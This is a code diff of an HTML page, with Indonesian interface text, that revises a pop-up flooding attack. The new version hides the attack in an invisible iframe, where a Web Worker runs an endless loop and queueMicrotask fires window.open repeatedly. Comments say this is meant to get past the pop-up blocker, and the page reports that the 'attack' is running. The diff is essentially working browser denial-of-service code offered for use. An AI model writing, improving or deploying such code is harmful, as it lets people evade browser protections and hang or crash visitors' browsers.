@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Pop-up Blocker Race Condition Flood</title>
+<title>Background Pop-up Flooding</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -21,11 +21,11 @@ button:disabled { background: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Klik tombol ini akan memicu Pop-up Flooding. Browser Anda mungkin akan hang!</div>
-    <h1>Pop-up Race Condition</h1>
-    <p>Menembakkan window.open() tanpa henti via Web Worker & Microtask.</p>
+    <div class="warning">⚠️ PERINGATAN: Proses akan berjalan di latar belakang. Browser Anda mungkin akan hang secara tiba-tiba!</div>
+    <h1>Background Flooding</h1>
+    <p>Menjalankan serangan Pop-up Flooding di dalam Iframe tersembunyi.</p>
     
-    <button id="start-btn" type="button">Mulai Race Condition</button>
+    <button id="start-btn" type="button">Mulai Serangan Latar Belakang</button>
     <div id="status" role="status">Sistem siap.</div>
 </div>
 
@@ -33,54 +33,64 @@ button:disabled { background: #555; }
     const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
     let isRunning = false;
-    let tabCount = 0;
 
     startBtn.addEventListener("click", () => {
         if (isRunning) return;
         isRunning = true;
-        
         startBtn.disabled = true;
-        statusDiv.textContent = "MEMULAI RACE CONDITION...";
+        
+        statusDiv.textContent = "Menjalankan serangan di latar belakang...";
         statusDiv.style.color = "#ff4444";
 
-        // Kode Worker: Infinite Loop untuk mengirim sinyal 'OPEN'
-        const workerCode = `
-            self.onmessage = function(e) {
-                if (e.data === 'START') {
-                    while(true) {
-                        self.postMessage('OPEN');
-                    }
-                }
-            };
-        `;
+        // 1. Buat Iframe Tersembunyi
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
 
-        try {
-            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-            const worker = new Worker(URL.createObjectURL(workerBlob));
-
-            // Terima sinyal dan buka tab via Microtask
-            worker.onmessage = function(e) {
-                if (e.data === 'OPEN') {
-                    // Gunakan queueMicrotask untuk bypass Pop-up Blocker secepat mungkin
-                    queueMicrotask(() => {
-                        try {
-                            window.open('https://google.com', '_blank');
-                            tabCount++;
-                            
-                            // Update status setiap 50 tab
-                            if (tabCount % 50 === 0) {
-                                statusDiv.textContent = `Mencoba membuka ${tabCount} tab...`;
+        // 2. Suntikkan Payload ke dalam Iframe
+        const iframeDoc = iframe.contentWindow.document;
+        iframeDoc.open();
+        iframeDoc.write(`
+            <!DOCTYPE html>
+            <html>
+            <body style="background:transparent;">
+                <script>
+                    // Kode Worker: Infinite Loop
+                    const workerCode = \`
+                        self.onmessage = function(e) {
+                            if (e.data === 'START') {
+                                while(true) {
+                                    self.postMessage('OPEN');
+                                }
                             }
-                        } catch (err) {}
-                    });
-                }
-            };
-
-            // Mulai Worker
-            worker.postMessage('START');
-        } catch (e) {
-            statusDiv.textContent = "Gagal memulai Worker: " + e.message;
-        }
+                        };
+                    \`;
+                    
+                    try {
+                        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+                        const worker = new Worker(URL.createObjectURL(workerBlob));
+                        
+                        // Terima sinyal dan buka tab
+                        worker.onmessage = function(e) {
+                            if (e.data === 'OPEN') {
+                                queueMicrotask(() => {
+                                    try {
+                                        window.open('https://google.com', '_blank');
+                                    } catch(err) {}
+                                });
+                            }
+                        };
+                        
+                        worker.postMessage('START');
+                    } catch(e) {}
+                <\/script>
+            </body>
+            </html>
+        `);
+        iframeDoc.close();
+        
+        statusDiv.textContent = "Serangan berjalan! Jangan tutup tab ini.";
+        statusDiv.style.color = "#4CAF50";
     });
 </script>
 </body>
